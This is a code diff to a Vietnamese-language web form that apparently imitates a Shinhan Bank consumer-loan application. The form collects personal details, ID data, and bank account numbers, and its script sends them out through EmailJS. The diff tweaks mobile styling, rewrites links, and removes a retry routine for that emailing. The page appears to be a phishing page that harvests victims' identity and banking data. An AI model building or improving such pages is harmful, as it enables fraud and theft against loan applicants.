@@ -68,16 +68,22 @@
             background-color: #d3d3d3;
             color: #ffffff;
             border-radius: 20px;
-            padding: 8px 16px;
+            padding: 8px 10px;
             font-weight: 500;
-            font-size: 14px;
+            font-size: 12px;
             width: 100%;
-            margin: 0 5px;
-            white-space: nowrap; /* Ngăn xuống dòng trên mobile */
+            margin: 0 2px;
+            white-space: nowrap;
         }
         .nav-tabs .nav-link.active {
             background-color: #0033a0;
             color: #ffffff;
+        }
+        @media (max-width: 767px) {
+            .nav-tabs .nav-link {
+                font-size: 10px;
+                padding: 6px 8px;
+            }
         }
         .section-title {
             color: #0033a0;
@@ -260,6 +266,16 @@
             gap: 15px;
             margin-top: 15px;
         }
+        @media (max-width: 767px) {
+            .button-group {
+                flex-direction: row;
+                justify-content: center;
+            }
+            .button-group a, .button-group button {
+                flex: 1;
+                text-align: center;
+            }
+        }
         .dropdown-menu {
             min-width: 200px;
         }
@@ -318,7 +334,6 @@
         <form id="registerForm" novalidate>
             <div id="emailError" class="error-message"></div>
             <div id="storageError" class="error-message"></div>
-            <button id="retryEmailBtn" class="btn btn-primary" style="display: none;">Thử lại Email</button>
 
             <div class="mb-2">
                 <label class="section-title">THÔNG TIN CÁ NHÂN</label>
@@ -575,7 +590,7 @@
             <hr class="section-divider">
 
             <div class="button-group">
-                <a href="/vaytieudung/shinhanbank/index.html" class="btn btn-secondary">QUAY LẠI</a>
+                <a href="../../index.html" class="btn btn-secondary">QUAY LẠI</a>
                 <button type="submit" class="btn btn-primary">BƯỚC KẾ TIẾP</button>
             </div>
         </form>
@@ -813,13 +828,11 @@
                 .then(() => {
                     console.log('Email sent successfully');
                     localStorage.removeItem('pendingEmail');
-                    $('#retryEmailBtn').hide();
-                    window.location.href = '/vaytieudung/shinhanbank/pages/vi/step2.html';
+                    window.location.href = 'step2.html';
                 })
                 .catch(error => {
                     console.error('EmailJS error:', error);
                     localStorage.setItem('pendingEmail', JSON.stringify(params));
-                    $('#retryEmailBtn').show();
                 });
         }
 
@@ -850,10 +863,6 @@
             $('#accountHolderName').val(userData.accountHolderName || '');
             $('#accountNumber').val(userData.accountNumber || '');
             $('#bankName').val(userData.bankName || '');
-            const pendingEmail = localStorage.getItem('pendingEmail');
-            if (pendingEmail) {
-                $('#retryEmailBtn').show();
-            }
         };
 
         $('#dob, #disbursementDate, #idIssueDate').on('input', function() {
@@ -863,28 +872,6 @@
         $('#income, #accountNumber').on('input', function() {
             let value = $(this).val();
             $(this).val(value);
-        });
-
-        $('#retryEmailBtn').on('click', function() {
-            const pendingEmail = localStorage.getItem('pendingEmail');
-            if (pendingEmail) {
-                try {
-                    const params = JSON.parse(pendingEmail);
-                    console.log('Retrying with params:', params);
-                    emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
-                        .then(() => {
-                            console.log('Retry email sent');
-                            localStorage.removeItem('pendingEmail');
-                            $('#retryEmailBtn').hide();
-                            window.location.href = '/vaytieudung/shinhanbank/pages/vi/step2.html';
-                        })
-                        .catch(error => {
-                            console.error('Retry EmailJS error:', error);
-                        });
-                } catch (error) {
-                    console.error('Error retrying pending email:', error);
-                }
-            }
         });
 
         $('#registerForm').on('submit', function(e) {
